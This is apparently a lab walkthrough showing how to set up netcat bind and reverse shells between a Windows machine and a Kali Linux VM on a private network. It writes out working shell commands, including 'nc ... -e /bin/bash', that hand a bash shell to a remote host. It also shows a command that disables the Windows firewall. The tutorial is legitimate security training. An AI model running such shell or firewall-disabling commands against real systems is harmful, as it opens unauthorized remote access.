# Netcat Shells: Exposing Kali Linux to Windows

## 📖 Overview
This document provides a step-by-step walkthrough of establishing both a **Bind Shell** and a **Reverse Shell** using Netcat (`nc`), specifically focusing on scenarios where the Windows machine gains command-line access to the Kali Linux machine (`/bin/bash`). 

---

## 🔍 Phase 1: Network Discovery & Configuration

Before attempting either connection, we must configure the network, disable security boundaries for the lab, and verify the locations of our tools.

### 1. Kali Linux Network Configuration
We run `ifconfig` on the Kali Linux machine to identify its local IP address on the `eth0` interface.
* **IP Address:** `192.168.1.4`

*(Screenshot showing the ifconfig output on Kali Linux)*
 <img width="1920" height="922" alt="VirtualBox_kali linux_15_07_2026_14_20_17" src="https://github.com/user-attachments/assets/ae307455-4faf-422a-87cc-c74bace0eae5" />


### 2. Windows Firewall & IP Configuration
On the Windows machine, we disable the firewall (`netsh advfirewall set allprofiles state off`) to ensure no traffic is blocked. We then run `ipconfig` to confirm its local IP address.
* **IP Address:** `192.168.1.11`

*(Screenshot showing the Windows firewall disabled and ipconfig output)*
![Windows Firewall and IP](IMG-20260715-WA0001.jpg)

### 3. Windows Netcat Directory
We navigate to the directory on the Windows machine containing the `nc.exe` binary.
*(Screenshot showing the directory with nc.exe on Windows)*
![Windows Netcat Directory](IMG-20260715-WA0012.jpg)

---

## ⚙️ Phase 2: Scenario A - Bind Shell (Windows Connects to Kali)

In a bind shell, the target (Kali) opens a local port and binds its bash shell to it. The client (Windows) then connects to that port.

### 1. Setting Up the Bind Shell (Kali Linux)
On the Kali Linux machine, we instruct Netcat to listen on port `4455` and execute `/bin/bash` upon a successful connection.
* **Command:** `nc -lvp 4455 -e /bin/bash`
    * **`-l`**: Listen mode.
    * **`-v`**: Verbose output.
    * **`-p 4455`**: Listen on port 4455.
    * **`-e /bin/bash`**: Execute the bash shell and pipe it to the connection.

*(Screenshot showing the execution of the bind shell command on Kali)*
![Kali Bind Shell Execution](IMG-20260715-WA0017.jpg)

The terminal outputs `listening on [any] 4455 ...` and hangs, waiting for an incoming connection.
*(Screenshot showing Kali actively listening)*
![Kali Listening on Port](IMG-20260715-WA0018.jpg)

### 2. Connecting to the Shell (Windows)
From the Windows command prompt, we use `nc.exe` to connect to Kali's IP and port.
* **Command:** `nc.exe -v 192.168.1.4 4455`

*(Screenshot showing Windows connecting to the Kali listener)*
![Windows Connecting to Bind Shell](IMG-20260715-WA0019.jpg)

### 3. Access Confirmed
Once connected, the Windows terminal receives Kali's bash shell. Running commands like `ls` reveals the Kali directory structure, confirming full interactive access.
*(Screenshot showing Windows interacting with the Kali Linux bash shell)*
![Windows Interacting with Kali Shell](IMG-20260715-WA0021.jpg)

---

## 💥 Phase 3: Scenario B - Reverse Shell (Kali Connects to Windows)

In a reverse shell, the client (Windows) sets up a listener, and the target (Kali) actively initiates the connection, sending its bash shell backwards to the client. This is often used to bypass inbound firewalls on the target.

### 1. Setting Up the Listener (Windows)
On the Windows machine, we start Netcat in listening mode on port `4455` to catch the incoming shell.
* **Command:** `nc.exe -lvp 4455`

*(Screenshot showing Windows listening on port 4455)*
![Windows Netcat Listener](IMG-20260715-WA0022.jpg)

### 2. Executing the Reverse Shell (Kali Linux)
On the Kali Linux machine, we execute a command that connects to the Windows IP and pipes the bash shell (`/bin/bash`) over the network socket.
* **Command:** `nc 192.168.1.11 4455 -e /bin/bash`

*(Screenshot showing Kali executing the reverse connection back to Windows)*
![Kali Executing Reverse Shell](IMG-20260715-WA0023.jpg)

### 3. Shell Caught (Windows)
Returning to the Windows terminal, we see the connection from `192.168.1.4` is accepted. Executing standard Linux commands like `ls` confirms that the reverse shell was successfully caught and provides full command-line access to Kali.
*(Screenshot showing Windows catching the reverse shell and executing commands)*
![Windows Catching Reverse Shell](IMG-20260715-WA0024.jpg)
